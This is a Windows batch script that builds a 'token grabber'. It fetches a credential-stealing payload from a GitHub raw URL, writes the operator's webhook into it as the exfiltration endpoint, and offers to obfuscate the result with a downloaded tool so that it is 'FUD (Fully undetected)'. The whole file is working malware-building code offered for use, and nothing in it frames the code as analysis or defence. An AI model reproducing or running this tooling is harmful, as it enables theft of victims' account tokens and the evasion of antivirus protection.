@echo off
cd /d %~dp0
color 0a
title Token Grabber Builder
setlocal EnableDelayedExpansion

echo Bulid Options (1=bat, 2=ps1):
choice /C 12 /M "Select a build option:" /N

if %errorlevel% == 1 ( set "file=bat" ) else ( set "file=ps1" )

set "urled=https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.%file%"

echo Building bat file...
echo Downloading main.%file% from %urled%...
::now I could technically do ALL of this in batch but ion feel suicidal today
powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(Invoke-WebRequest -Uri '%urled%' -UseBasicParsing).Content | Set-Content main.%file%"

echo Enter webhook URL:
set /p url="URL: "

set "batch_path=%~dp0\main.%file%"

powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(Get-Content %batch_path%) -replace 'YOUR_WEBHOOK_HERE', '%url%' | Set-Content %batch_path%"

echo Would you like to obfuscate and make it FUD (Fully undetected)? (y/n)
choice /C yn /M "Select an option:" /N

if %errorlevel% == 1 ( goto :obfuscate ) else ( goto :eof )

:obfuscate
if %file% == "ps1" ( goto :obfuscate_ps1 ) else ( goto :obfuscate_bat )

:obfuscate_bat
echo Downloading Obfuscator. It requires python so if you don't have it, it won't work. The obfuscator link is https://github.com/somalifuscator. This ONLY WORKS for the batch file. Otherwise use Invoke-Obfuscation
timeout /t 7
rmdir /s /q somalifuscator > nul 2>&1
echo downloading somalifuscator, this may take a few seconds
powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')"
echo extracting somalifuscator
powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "Expand-Archive somalifuscator.zip"
set "somalifuscator_path=%~dp0Somalifuscator\Somalifuscator-main"
del /f /q somalifuscator.zip
echo obfuscating
start /Wait %somalifuscator_path%\setup.bat %~dp0\main.bat ultimate
if %errorlevel% == 0 ( echo Obfuscation successful ) else ( echo Obfuscation failed. Please try again. Or join the server for support )
exit /b 0

:obfuscate_ps1
echo Please download Invoke-Obfuscation of another powershell obfuscator. Somalifuscator will not work for this.
pause
exit /b 0

echo finished
pause
exit /b 0